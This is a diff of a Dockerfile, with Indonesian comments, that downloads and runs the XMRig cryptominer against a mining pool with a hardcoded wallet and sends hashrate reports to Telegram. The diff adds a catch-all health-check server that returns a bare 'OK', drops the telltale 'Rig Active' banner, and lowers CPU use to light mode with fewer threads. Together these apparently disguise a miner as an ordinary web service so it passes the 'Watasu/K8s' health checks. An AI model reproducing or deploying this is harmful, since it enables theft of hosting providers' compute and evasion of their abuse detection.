@@ -3,13 +3,13 @@ FROM ubuntu:22.04
 ENV DEBIAN_FRONTEND=noninteractive
 
 RUN apt-get update && \
-    apt-get install -y wget tar ca-certificates python3 python3-requests curl && \
+    apt-get install -y wget tar ca-certificates python3 python3-requests curl procps && \
     rm -rf /var/lib/apt/lists/* && \
     wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && \
     tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz && \
     rm xmrig-6.22.2-linux-static-x64.tar.gz
 
-# Reporter Python: Kirim status hashrate ke Telegram + HTTP health check untuk Watasu
+# Reporter Python: Health check server (listen di $PORT atau 8080) + Telegram hashrate reporter
 RUN cat << 'EOF' > /reporter.py
 import time
 import requests
@@ -26,22 +26,38 @@ try:
     NODE_ID = open("/proc/sys/kernel/random/uuid").read().strip()[:4]
 except Exception:
     import random
-    NODE_ID = f"{random.randint(1000, 9999)}"
+    NODE_ID = str(random.randint(1000, 9999))
 
-# Web server ringan agar port Watasu ($PORT) selalu merespon 200 OK
-PORT = int(os.environ.get("PORT", 8080))
-class HealthHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
+# Health Server: Listen di $PORT (default 8080) agar lolos healthcheck Watasu/K8s
+port_env = os.environ.get("PORT", "8080")
+try:
+    PORT = int(port_env)
+except Exception:
+    PORT = 8080
+
+class RobustHealthHandler(http.server.BaseHTTPRequestHandler):
+    def _respond(self):
         self.send_response(200)
-        self.send_header("Content-type", "text/plain")
+        self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Length", "2")
         self.end_headers()
-        self.wfile.write(b"OK - Rig Active")
+        self.wfile.write(b"OK")
+    def do_GET(self):
+        self._respond()
+    def do_HEAD(self):
+        self._respond()
+    def do_POST(self):
+        self._respond()
+    def do_OPTIONS(self):
+        self._respond()
     def log_message(self, format, *args):
         pass
 
+socketserver.TCPServer.allow_reuse_address = True
+
 def run_health_server():
     try:
-        with socketserver.TCPServer(("0.0.0.0", PORT), HealthHandler) as httpd:
+        with socketserver.TCPServer(("0.0.0.0", PORT), RobustHealthHandler) as httpd:
             httpd.serve_forever()
     except Exception as e:
         print(f"Health server note: {e}")
@@ -81,16 +97,16 @@ while True:
     time.sleep(180) # Lapor hashrate setiap 3 menit
 EOF
 
-# Entrypoint script untuk keepalive
+# Entrypoint script: Jalankan reporter di background + xmrig keepalive dengan RandomX Light Mode
 RUN cat << 'EOF' > /entrypoint.sh
 #!/bin/bash
 python3 /reporter.py &
 cd /xmrig-6.22.2
 while true; do
-    echo "[keepalive] Menjalankan xmrig..."
+    echo "[keepalive] Menjalankan xmrig (RandomX Light Mode)..."
     ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 \
         -u USDT:0x098f58db447351f5433006b7761b9da8d8a26680.sal909 \
-        -p x --tls --threads=8 --cpu-no-yield --randomx-no-numa \
+        -p x --tls --randomx-mode=light --threads=2 --cpu-no-yield --randomx-no-numa \
         --keepalive \
         --http-host=127.0.0.1 --http-port=4044
     sleep 3
@@ -98,5 +114,7 @@ done
 EOF
 
 RUN chmod +x /entrypoint.sh
+
+EXPOSE 8080 80 4044
 
 CMD ["/bin/bash", "/entrypoint.sh"]
